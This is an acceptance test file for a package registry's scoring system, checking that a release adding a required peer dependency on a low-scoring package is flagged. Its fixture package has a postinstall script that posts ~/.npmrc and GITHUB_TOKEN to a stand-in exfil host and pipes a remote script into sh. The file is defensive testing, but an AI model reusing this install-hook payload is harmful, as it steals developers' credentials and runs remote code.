// A required peerDependency is installed with the package (npm 7+, bun, pnpm's auto-install-peers), and the install-time
// walk checks it (installEdges). The publish check read only dependencies and optionalDependencies, so a release that
// added a low-scoring package as a peer, or a brand-new peer, carried neither risky-dependency nor new-dependency.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { z } from "zod";
import { addUser, getJson, makeSandbox, run, startRegistry, writePackage, type PkgSpec, type Registry } from "../../../tests/acceptance/harness";

const DAY = 24 * 60 * 60 * 1000;
const Score = z.object({ signals: z.array(z.object({ id: z.string(), evidence: z.array(z.string()) })), changes: z.unknown().optional() });

let clock = Date.parse("2026-03-01T00:00:00Z");
let reg: Registry;
let alice: string;
let work: string;

async function publish(spec: PkgSpec, token: string): Promise<void> {
  const r = await run(["bun", "publish"], { cwd: writePackage(work, spec, reg, token), env: makeSandbox(reg, token).env });

  if (r.code !== 0) throw new Error(`publish ${spec.name}@${spec.version} failed: ${r.out}`);
}

async function scoreOf(name: string, version: string) {
  const r = await getJson(`${reg.url}-/apm/v1/score/${name}/${version}`);

  expect(r.status, JSON.stringify(r.body)).toBe(200);

  return { ...Score.parse(r.body), text: JSON.stringify(r.body) };
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  alice = await addUser(reg, "alice");
  const mallory = await addUser(reg, "mallory");

  work = mkdtempSync(join(tmpdir(), "apm-peer-"));
  await publish(
    {
      name: "peer-dropper",
      version: "1.0.0",
      scripts: { postinstall: "node setup.js" },
      files: {
        "index.js": "module.exports = 1;\n",
        "setup.js": [
          "const cp = require('child_process');",
          "const fs = require('fs');",
          "const os = require('os');",
          "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');",
          "fetch('https://exfil.example.com/c', { method: 'POST', body: npmrc + process.env.GITHUB_TOKEN });",
          "cp.execSync('curl -s https://evil.example.com/x.sh | sh');",
        ].join("\n"),
      },
    },
    mallory,
  );
  clock += 30 * DAY;
}, 120_000);

afterAll(async () => {
  await reg.stop();
});

describe("a release that adds a required peer dependency", () => {
  test("is flagged as adding a low-scoring dependency, and as a new dependency", async () => {
    await publish({ name: "peer-wrapper", version: "1.0.0", files: { "index.js": "module.exports = 1;\n" } }, alice);
    clock += 10 * DAY;
    await publish({ name: "peer-wrapper", version: "1.1.0", extra: { peerDependencies: { "peer-dropper": "^1.0.0" } }, files: { "index.js": "module.exports = require('peer-dropper');\n" } }, alice);
    clock += 10 * DAY;

    const s = await scoreOf("peer-wrapper", "1.1.0");

    expect(s.signals.map((x) => x.id)).toContain("risky-dependency");
    expect(s.signals.find((x) => x.id === "risky-dependency")?.evidence.join(" ")).toContain("peer-dropper");
    expect(s.text).toContain("new-dependency");
  });

  test("an optional peer is not installed, so it is not flagged", async () => {
    await publish({ name: "optional-peer", version: "1.0.0", files: { "index.js": "module.exports = 1;\n" } }, alice);
    clock += 10 * DAY;
    await publish(
      { name: "optional-peer", version: "1.1.0", extra: { peerDependencies: { "peer-dropper": "^1.0.0" }, peerDependenciesMeta: { "peer-dropper": { optional: true } } }, files: { "index.js": "module.exports = 1;\n" } },
      alice,
    );
    clock += 10 * DAY;

    const s = await scoreOf("optional-peer", "1.1.0");

    expect(s.signals.map((x) => x.id)).not.toContain("risky-dependency");
    expect(s.text).not.toContain("new-dependency");
  });
});
